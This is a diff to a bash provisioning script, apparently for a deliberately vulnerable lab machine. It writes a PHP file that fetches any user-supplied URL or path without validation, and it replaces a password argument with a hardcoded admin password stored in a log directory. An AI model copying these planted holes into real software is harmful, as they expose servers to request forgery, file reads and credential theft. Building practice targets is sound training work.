@@ -1,7 +1,5 @@
 #!/bin/bash
 
-admin_pass = $1
-
 echo "Detecting Operating System For Package Installations"
 DISTRO=$(cat /etc/*-release 2>/dev/null)
 if [ $(echo $DISTRO | grep -i "CentOs" | wc -l) -eq 1 ]; then
@@ -57,7 +55,7 @@ touch /var/www/html/send.py
 echo "Filling Files With Data"
 echo "<?php file_get_contents(\$_GET['url']);" > /var/www/html/url.php
 
-echo "$admin_pass" > /var/log/Paison/Accounts/admin.acc
+echo "NotAHakr" > /var/log/Paison/Accounts/admin.acc
 
 echo "import os" > /var/www/html/send.py
 echo "import ipgetter" >> /var/www/html/send.py
